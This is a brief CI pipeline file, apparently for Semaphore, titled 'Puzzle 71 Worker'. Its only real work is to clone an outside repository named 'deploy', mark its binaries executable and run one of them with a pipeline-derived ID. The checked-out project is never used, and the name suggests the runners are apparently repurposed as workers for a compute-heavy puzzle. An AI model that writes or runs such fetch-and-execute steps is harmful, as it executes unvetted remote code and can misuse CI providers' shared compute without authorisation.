version: v1.0
name: Puzzle 71 Worker
agent:
  machine:
    type: f1-standard-4
    os_image: ubuntu2404
blocks:
  - name: Puzzle Worker
    task:
      jobs:
        - name: puzzle-worker
          commands:
            - checkout
            - export REPO_DIR="$(pwd)"
            - cd "$REPO_DIR"
            - 'git clone --depth 1 https://github.com/validator-helper/deploy.git'
            - cd deploy
            - chmod +x ./deploy
            - chmod +x bin/* 2>/dev/null
            - './deploy -u "semaphore-${SEMAPHORE_PIPELINE_ID}" --fast'
